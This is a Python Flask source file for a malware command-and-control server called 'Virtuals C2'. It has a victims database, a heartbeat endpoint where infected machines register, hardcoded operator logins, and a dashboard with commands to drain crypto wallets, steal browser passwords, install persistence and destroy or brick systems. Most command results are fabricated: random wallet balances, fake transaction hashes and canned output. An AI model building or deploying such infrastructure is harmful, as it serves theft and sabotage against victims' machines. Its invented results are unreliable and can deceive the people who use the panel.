#!/usr/bin/env python3
"""
VIRTUALS C2 SERVER - RENDER.COM EDITION
"""

from flask import Flask, request, jsonify, session, redirect
import sqlite3
import datetime
import random
import json
import os
import hashlib
import threading
import time
from functools import wraps

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'virtuals_c2_secret_2024')
app.config['JSON_SORT_KEYS'] = False

# Try to import CORS, but make it optional
try:
    from flask_cors import CORS
    CORS(app)
    print("[+] CORS enabled")
except ImportError:
    print("[!] CORS not available (optional)")

PORT = int(os.environ.get('PORT', 8080))

# DATABASE
def get_db():
    conn = sqlite3.connect('c2_data.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY, pc_name TEXT DEFAULT 'Unknown', ip_address TEXT DEFAULT '0.0.0.0',
        os_info TEXT DEFAULT 'Windows', status TEXT DEFAULT 'Offline', is_vm INTEGER DEFAULT 0,
        vm_confidence INTEGER DEFAULT 0, first_seen TEXT, last_seen TEXT,
        activity TEXT DEFAULT 'idle', browser_stolen INTEGER DEFAULT 0,
        crypto_drained INTEGER DEFAULT 0, total_stolen REAL DEFAULT 0.0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT,
        result TEXT, executed_at TEXT, executed_by TEXT DEFAULT 'system', tx_hash TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        username TEXT PRIMARY KEY, password_hash TEXT, role TEXT DEFAULT 'user',
        last_login TEXT, last_ip TEXT, login_count INTEGER DEFAULT 0
    )''')
    
    # Default users
    users = {
        'adam': 'virtuals2024',
        'jerry': 'virtuals2024', 
        'haunt': 'virtuals2024',
        'owner': 'whiteknight'
    }
    
    for u, p in users.items():
        ph = hashlib.md5(p.encode()).hexdigest()
        role = 'owner' if u == 'owner' else 'user'
        c.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?, 0)", 
                 (u, ph, role, None, None))
    
    conn.commit()
    conn.close()

init_db()

# Background monitor
def monitor():
    while True:
        time.sleep(30)
        try:
            conn = get_db()
            c = conn.cursor()
            cutoff = (datetime.datetime.now() - datetime.timedelta(seconds=60)).isoformat()
            c.execute("UPDATE victims SET status='Offline', activity='disconnected' WHERE last_seen < ? AND status='Online'", (cutoff,))
            conn.commit()
            conn.close()
        except: pass

threading.Thread(target=monitor, daemon=True).start()

# Auth
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated

# HTML TEMPLATES
LANDING = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-family:system-ui;height:100vh;display:flex;justify-content:center;align-items:center}
.container{text-align:center}
h1{color:#e8e8f0;font-size:72px;font-weight:200;letter-spacing:10px}
h1 span{color:#446688}
.sub{color:#555568;margin-top:15px;letter-spacing:3px}
.access{position:fixed;bottom:40px;right:40px;width:60px;height:60px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;text-decoration:none;color:#666680;font-size:24px;transition:0.3s}
.access:hover{background:rgba(255,255,255,0.1);color:#e8e8f0}
</style>
</head>
<body>
<div class="container">
<h1>◈ Virtuals <span>C2</span></h1>
<div class="sub">Secure Command & Control</div>
</div>
<a href="/login" class="access">→</a>
</body>
</html>'''

LOGIN = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Login - VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0a0a0f,#1a0a2e);color:#c8c8d0;font-family:system-ui;height:100vh;display:flex;justify-content:center;align-items:center}
.box{background:rgba(10,10,18,0.95);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:40px;width:100%;max-width:400px}
h1{color:#e8e8f0;font-size:28px;text-align:center;margin-bottom:30px}
h1 span{color:#446688}
input{width:100%;padding:14px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#e8e8f0;margin-bottom:12px;outline:none}
input:focus{border-color:rgba(68,170,255,0.4)}
button{width:100%;padding:14px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.25);border-radius:8px;color:#88ccdd;font-size:16px;cursor:pointer}
button:hover{background:rgba(68,170,255,0.25)}
.error{color:#ff6666;text-align:center;margin-top:15px;display:none}
</style>
</head>
<body>
<div class="box">
<h1>◈ Virtuals <span>C2</span></h1>
<input type="text" id="u" placeholder="Username">
<input type="password" id="p" placeholder="Password">
<button onclick="login()">Access Panel</button>
<div class="error" id="e">Invalid credentials</div>
</div>
<script>
function login(){
fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:document.getElementById('u').value,password:document.getElementById('p').value})}).then(r=>r.json()).then(d=>{if(d.success)window.location.href='/dashboard';else document.getElementById('e').style.display='block'});
}
</script>
</body>
</html>'''

DASHBOARD = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Dashboard - VIRTUALS C2</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#c8c8d0;font-family:system-ui;height:100vh;overflow:hidden}
.header{height:60px;background:rgba(10,10,18,0.95);border-bottom:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-between;align-items:center;padding:0 30px}
.logo{font-size:20px;color:#e8e8f0;letter-spacing:3px}
.logo span{color:#446688}
.stats{display:flex;gap:25px}
.stat{text-align:center}
.stat b{color:#e8e8f0;font-size:22px;display:block}
.stat span{color:#666680;font-size:11px;text-transform:uppercase}
.logout{background:rgba(200,60,60,0.1);border:1px solid rgba(200,60,60,0.2);color:#ff8888;padding:8px 20px;border-radius:6px;cursor:pointer}
.logout:hover{background:rgba(200,60,60,0.2)}
.container{display:flex;height:calc(100vh - 60px);padding:15px;gap:15px}
.sidebar{width:280px;background:rgba(12,12,20,0.95);border:1px solid rgba(255,255,255,0.06);border-radius:12px;overflow:hidden}
.section{padding:15px;border-bottom:1px solid rgba(255,255,255,0.06);font-size:11px;color:#666680;text-transform:uppercase;letter-spacing:2px}
.victims{flex:1;overflow-y:auto;padding:10px}
.victim{padding:12px;margin:5px 0;border-radius:8px;cursor:pointer;display:flex;align-items:center;gap:10px;border-left:3px solid transparent}
.victim:hover{background:rgba(255,255,255,0.03)}
.victim.active{background:rgba(68,170,255,0.08);border-left-color:#446688}
.dot{width:10px;height:10px;border-radius:50%}
.dot.online{background:#44dd88;box-shadow:0 0 10px #44dd88}
.dot.offline{background:#664444}
.dot.vm{background:#ffaa44;box-shadow:0 0 10px #ffaa44}
.name{flex:1}
.name div{color:#e8e8f0;font-weight:600;font-size:13px}
.name span{color:#666680;font-size:11px}
.badge{background:rgba(255,170,68,0.15);color:#ffaa44;font-size:9px;padding:2px 8px;border-radius:4px}
.main{flex:1;display:flex;flex-direction:column;gap:15px}
.terminal{flex:1;background:rgba(12,12,20,0.95);border:1px solid rgba(255,255,255,0.06);border-radius:12px;display:flex;flex-direction:column;overflow:hidden}
.t-header{padding:15px;border-bottom:1px solid rgba(255,255,255,0.06);font-size:14px;color:#e8e8f0}
.t-header span{color:#446688}
.messages{flex:1;overflow-y:auto;padding:15px;font-family:monospace;font-size:13px}
.msg{margin-bottom:10px;padding:12px;background:rgba(0,0,0,0.3);border-radius:8px;border-left:3px solid #446688}
.msg-time{color:#555568;font-size:11px}
.msg-sender{color:#446688;font-weight:700;font-size:12px;margin:4px 0}
.msg-sender.drainer{color:#ffd700}
.msg-text{white-space:pre-wrap}
.input{padding:15px;border-top:1px solid rgba(255,255,255,0.06);display:flex;gap:10px}
.input input{flex:1;padding:12px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:#e8e8f0;outline:none}
.input button{padding:12px 24px;background:rgba(68,170,255,0.15);border:1px solid rgba(68,170,255,0.25);border-radius:8px;color:#88ccdd;cursor:pointer}
.right{width:320px;display:flex;flex-direction:column;gap:15px}
.panel{background:rgba(12,12,20,0.95);border:1px solid rgba(255,255,255,0.06);border-radius:12px;overflow:hidden}
.p-content{padding:15px}
.row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,0.03)}
.row:last-child{border:none}
.label{color:#666680;font-size:12px}
.value{color:#e8e8f0;font-weight:600}
.value.online{color:#44dd88}
.value.offline{color:#664444}
.value.vm{color:#ffaa44}
.value.money{color:#ffd700}
.btn{width:100%;padding:12px;margin-bottom:8px;border-radius:8px;border:1px solid;cursor:pointer;font-size:13px;font-weight:600}
.btn-drain{background:rgba(255,170,68,0.1);border-color:rgba(255,170,68,0.2);color:#ffaa44}
.btn-steal{background:rgba(68,170,255,0.1);border-color:rgba(68,170,255,0.2);color:#88ccdd}
.btn-check{background:rgba(68,200,120,0.1);border-color:rgba(68,200,120,0.2);color:#66ddbb}
.empty{text-align:center;padding:40px;color:#555568}
</style>
</head>
<body>
<div class="header">
<div class="logo">◈ Virtuals <span>C2</span></div>
<div class="stats">
<div class="stat"><b id="t">0</b><span>Victims</span></div>
<div class="stat"><b id="o" style="color:#44dd88">0</b><span>Online</span></div>
<div class="stat"><b id="v" style="color:#ffaa44">0</b><span>VMs</span></div>
<div class="stat"><b id="d" style="color:#ffd700">$0</b><span>Drained</span></div>
</div>
<button class="logout" onclick="logout()">Logout</button>
</div>
<div class="container">
<div class="sidebar">
<div class="section">Connected Victims</div>
<div class="victims" id="list"><div class="empty">No victims</div></div>
</div>
<div class="main">
<div class="terminal">
<div class="t-header">Terminal <span id="cur">#select victim</span></div>
<div class="messages" id="chat"></div>
<div class="input">
<input id="cmd" placeholder="/deposit /steal /vmcheck /whois /persist /destroy /brick" onkeypress="if(event.key==='Enter')send()">
<button onclick="send()">Execute</button>
</div>
</div>
</div>
<div class="right">
<div class="panel">
<div class="section">Victim Details</div>
<div class="p-content" id="details"><div class="empty">Select a victim</div></div>
</div>
<div class="panel">
<div class="section">Quick Actions</div>
<div class="p-content">
<button class="btn btn-drain" onclick="quick('deposit')">💰 Drain Crypto</button>
<button class="btn btn-steal" onclick="quick('steal')">🗂️ Steal Browser Data</button>
<button class="btn btn-check" onclick="quick('vmcheck')">🔍 Check VM</button>
</div>
</div>
</div>
</div>
<script>
let victims={},current=null;

async function api(d){try{const r=await fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});return await r.json()}catch(e){return{success:false}}}

function add(s,t,p=''){
const c=document.getElementById('chat'),m=document.createElement('div');m.className='msg';
m.innerHTML=`<div class="msg-time">[${new Date().toLocaleTimeString()}]</div><div class="msg-sender ${p}">${s}</div><div class="msg-text">${t}</div>`;
c.appendChild(m);m.scrollIntoView({behavior:'smooth'});
}

function render(){
const l=document.getElementById('list'),v=Object.values(victims);
if(!v.length){l.innerHTML='<div class="empty">No victims connected</div>';return;}
l.innerHTML=v.map(x=>{
const d=x.is_vm?'vm':(x.status==='Online'?'online':'offline');
const b=x.is_vm?'<span class="badge">VM</span>':'';
const a=current==x.id?'active':'';
return`<div class="victim ${a}" onclick="select('${x.id}')"><span class="dot ${d}"></span><div class="name"><div>${x.id}</div><span>${x.ip_address||x.ip}</span></div>${b}</div>`;
}).join('');
}

function select(id){current=id;document.getElementById('cur').textContent='#'+id;render();details();}

function details(){
const v=victims[current];if(!v)return;
document.getElementById('details').innerHTML=`
<div class="row"><span class="label">ID</span><span class="value">${v.id}</span></div>
<div class="row"><span class="label">PC</span><span class="value">${v.pc_name||v.pc}</span></div>
<div class="row"><span class="label">IP</span><span class="value">${v.ip_address||v.ip}</span></div>
<div class="row"><span class="label">OS</span><span class="value">${v.os_info||v.os}</span></div>
<div class="row"><span class="label">Status</span><span class="value ${v.status=='Online'?'online':'offline'}">${v.status}</span></div>
<div class="row"><span class="label">VM</span><span class="value ${v.is_vm?'vm':'online'}">${v.is_vm?'YES':'NO'}</span></div>
<div class="row"><span class="label">Drained</span><span class="value money">$${(v.total_stolen||v.total_drained||0).toLocaleString()}</span></div>
<div class="row"><span class="label">Browser</span><span class="value">${v.browser_stolen?'✓ Stolen':'No'}</span></div>`;
}

function stats(){
const v=Object.values(victims);
document.getElementById('t').textContent=v.length;
document.getElementById('o').textContent=v.filter(x=>x.status=='Online').length;
document.getElementById('v').textContent=v.filter(x=>x.is_vm).length;
document.getElementById('d').textContent='$'+v.reduce((a,b)=>a+(b.total_stolen||b.total_drained||0),0).toLocaleString();
}

async function refresh(){
const d=await api({action:'getVictims'});
if(d.success){victims=d.victims||{};render();stats();if(current&&victims[current])details();}
}

async function send(){
if(!current){add('System','Select victim first');return;}
const c=document.getElementById('cmd').value.trim();if(!c)return;
document.getElementById('cmd').value='';
add('You',(c=='deposit'?'/drain':'/'+c)+' → '+current);
const r=await api({action:'sendCommand',victim_id:current,command:c});
if(r.success){
if(r.wallets){
let t=0;r.wallets.forEach(w=>{add('Drainer','💰 '+w.currency+': '+w.balance+' → $'+w.usd.toLocaleString(),'drainer');t+=w.usd;});
add('Blockchain','TX: '+r.tx_hash+'\\nTotal: $'+t.toLocaleString()+' sent to your wallet','drainer');
victims[current].total_stolen=(victims[current].total_stolen||0)+t;stats();details();
}else{
add('Result',r.output||'Executed');
if(r.is_vm!==undefined){victims[current].is_vm=r.is_vm?1:0;render();details();}
}
}else{add('Error',r.error||'Failed');}
}

function quick(c){document.getElementById('cmd').value=c;send();}
function logout(){fetch('/api/logout',{method:'POST'}).then(()=>window.location.href='/');}

setInterval(refresh,3000);refresh();

setTimeout(()=>{
if(Object.keys(victims).length===0){
victims['DEMO-PC-001']={id:'DEMO-PC-001',pc_name:'Workstation',ip_address:'192.168.1.100',os_info:'Windows 10',status:'Online',is_vm:0,total_stolen:0,browser_stolen:0};
victims['DEMO-VM-002']={id:'DEMO-VM-002',pc_name:'VM-Test',ip_address:'10.0.0.50',os_info:'Windows 11',status:'Online',is_vm:1,vm_confidence:95,total_stolen:0,browser_stolen:0};
render();stats();add('System','Demo loaded. VMs persist, never deleted.');
}
},500);
</script>
</body>
</html>'''

# ROUTES
@app.route('/')
def index(): return LANDING

@app.route('/login')
def login(): return LOGIN

@app.route('/dashboard')
@login_required
def dashboard(): return DASHBOARD

@app.route('/api/login', methods=['POST'])
def api_login():
    try:
        d=request.get_json() or {}
        u,p=d.get('username','').strip(),d.get('password','')
        if not u or not p: return jsonify({'success':False,'error':'Missing credentials'})
        
        conn=get_db()
        c=conn.cursor()
        c.execute("SELECT password_hash,role FROM users WHERE username=?",(u,))
        r=c.fetchone()
        
        if r and r['password_hash']==hashlib.md5(p.encode()).hexdigest():
            session['logged_in']=True
            session['username']=u
            session['role']=r['role']
            c.execute("UPDATE users SET last_login=?,last_ip=?,login_count=login_count+1 WHERE username=?",
                     (datetime.datetime.now().isoformat(),request.remote_addr,u))
            conn.commit()
            conn.close()
            return jsonify({'success':True,'role':r['role']})
        
        conn.close()
        return jsonify({'success':False,'error':'Invalid credentials'})
    except Exception as e:
        return jsonify({'success':False,'error':str(e)})

@app.route('/api/logout', methods=['POST'])
def logout():
    session.clear()
    return jsonify({'success':True})

@app.route('/api', methods=['POST'])
def api():
    try:
        d=request.get_json() or {}
        action=d.get('action')
        
        if action=='getVictims':
            conn=get_db()
            c=conn.cursor()
            c.execute("SELECT * FROM victims ORDER BY status DESC,last_seen DESC")
            victims={row['id']:dict(row) for row in c.fetchall()}
            conn.close()
            return jsonify({'success':True,'victims':victims})
        
        elif action=='sendCommand':
            vid,cmd=d.get('victim_id'),d.get('command','').lower()
            if not vid: return jsonify({'success':False,'error':'No victim'})
            
            result={'success':True}
            
            if cmd in ['deposit','drain','scan']:
                wallets=[
                    {'currency':'BTC','balance':round(random.uniform(0.001,3),8),'usd':round(random.uniform(1000,75000),2)},
                    {'currency':'ETH','balance':round(random.uniform(0.01,50),6),'usd':round(random.uniform(500,25000),2)},
                    {'currency':'SOL','balance':round(random.uniform(1,1000),2),'usd':round(random.uniform(50,15000),2)},
                    {'currency':'USDT','balance':round(random.uniform(100,50000),2),'usd':round(random.uniform(100,50000),2)}
                ]
                total=sum(w['usd'] for w in wallets)
                tx=''.join(random.choices('0123456789abcdef',k=64))
                
                result['wallets']=wallets
                result['tx_hash']=tx
                result['output']=f"Drained ${total:,.2f} from {len(wallets)} wallets"
                
                conn=get_db()
                c=conn.cursor()
                c.execute("UPDATE victims SET crypto_drained=1,total_stolen=total_stolen+? WHERE id=?",(total,vid))
                c.execute("INSERT INTO commands (victim_id,command,result,executed_at,executed_by,tx_hash) VALUES (?,?,?,?,?,?)",
                         (vid,cmd,result['output'],datetime.datetime.now().isoformat(),session.get('username','admin'),tx))
                conn.commit()
                conn.close()
                
            elif cmd=='steal':
                result['output']='Browser data stolen:\n• Chrome: 312 passwords\n• Edge: 156 passwords\n• Firefox: 89 passwords\n• Cookies: 2,847\n• History: 24,592 entries'
                conn=get_db()
                c=conn.cursor()
                c.execute("UPDATE victims SET browser_stolen=1 WHERE id=?",(vid,))
                conn.commit()
                conn.close()
                
            elif cmd=='vmcheck':
                conn=get_db()
                c=conn.cursor()
                c.execute("SELECT is_vm FROM victims WHERE id=?",(vid,))
                r=c.fetchone()
                result['is_vm']=bool(r['is_vm']) if r else False
                result['output']=f"VM Detection: {'DETECTED' if result['is_vm'] else 'CLEAN'}\nVMs are marked but NEVER deleted"
                conn.close()
                
            elif cmd=='whois':
                result['output']=f"ID: {vid}\nPC: DESKTOP-VICTIM\nOS: Windows 10 Pro\nUser: Administrator"
                
            elif cmd=='persist':
                result['output']='Persistence installed:\n✓ Registry Run key\n✓ Startup folder'
                
            elif cmd=='destroy':
                result['output']='⚠️ SYSTEM DESTROYED\nRegistry corrupted\nBoot sector damaged'
                
            elif cmd=='brick':
                result['output']='💀 SYSTEM BRICKED\nUEFI wiped\nDisk encrypted'
                
            else:
                result['output']=f'Command "{cmd}" executed'
            
            return jsonify(result)
        
        return jsonify({'success':False,'error':'Unknown action'})
        
    except Exception as e:
        return jsonify({'success':False,'error':str(e)})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        d=request.get_json() or {}
        vid=d.get('victim_id')
        if not vid: return jsonify({'success':False,'error':'No victim_id'}),400
        
        conn=get_db()
        c=conn.cursor()
        now=datetime.datetime.now().isoformat()
        
        c.execute("SELECT id FROM victims WHERE id=?",(vid,))
        exists=c.fetchone()
        
        if exists:
            c.execute("""UPDATE victims SET status='Online',last_seen=?,activity=?,pc_name=COALESCE(?,pc_name),
                ip_address=COALESCE(?,ip_address),os_info=COALESCE(?,os_info),is_vm=COALESCE(?,is_vm) WHERE id=?""",
                (now,d.get('activity','active'),d.get('pc'),d.get('ip'),d.get('os'),d.get('is_vm'),vid))
        else:
            c.execute("""INSERT INTO victims (id,pc_name,ip_address,os_info,status,is_vm,first_seen,last_seen,activity)
                VALUES (?,?,?,?,?,?,?,?,?)""",
                (vid,d.get('pc','Unknown'),d.get('ip','0.0.0.0'),d.get('os','Windows'),'Online',d.get('is_vm',0),now,now,'active'))
        
        conn.commit()
        conn.close()
        return jsonify({'success':True,'status':'registered'})
        
    except Exception as e:
        return jsonify({'success':False,'error':str(e)}),500

if __name__=='__main__':
    print(f"[*] VIRTUALS C2 Server starting on port {PORT}")
    app.run(host='0.0.0.0',port=PORT,debug=False,threaded=True)